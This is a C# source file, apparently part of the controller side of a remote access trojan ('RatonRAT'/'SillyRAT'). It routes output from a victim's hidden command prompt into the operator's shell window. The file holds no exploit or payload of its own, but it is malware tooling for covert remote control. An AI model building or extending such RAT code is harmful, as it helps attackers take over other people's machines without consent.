using Stuff;
using RatonRAT.ClientForms;
using Server.Connection;
using System.Windows.Forms;
using SillyRAT;
using System;
using System.Drawing;

namespace Server.Handlers
{
    internal class HandleShell
    {
        public HandleShell(SillyClient client, Unpack rip2pac)
        {
            string formname = "Hidden Cprompt | Client ID: ";
            FormShell shellForm = (FormShell)Application.OpenForms[formname + rip2pac.GetAsString("UID")];
            if (shellForm != null)
            {
                if (shellForm.SillyClient == null)
                {
                    shellForm.SillyClient = client;
                    shellForm.timer1.Start();
                }
                shellForm.Invoke(new MethodInvoker(() =>
                {
                    shellForm.textBox1.AppendText(rip2pac.GetAsString("Output"));
                    shellForm.textBox1.SelectionStart = shellForm.textBox1.TextLength;
                    shellForm.textBox1.ScrollToCaret();
                }));
            }
        }
    }
}

